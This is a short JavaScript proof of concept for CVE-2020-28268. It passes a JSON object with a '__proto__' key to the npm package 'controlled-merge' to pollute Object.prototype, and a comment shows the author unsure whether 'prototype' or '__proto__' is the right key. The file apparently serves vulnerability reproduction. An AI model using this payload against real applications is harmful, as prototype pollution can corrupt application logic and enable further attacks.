//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28268

const merge = require("controlled-merge");
const obj = merge(
  {},
  JSON.parse(
    // '{ "testProperty": "hi", "prototype" : { "polluted" : "yes" } }'
    // Which one should it be then?? This doesn't make sense
    '{ "testProperty": "hi", "__proto__" : { "polluted" : "yes" } }'
  ),
  true
);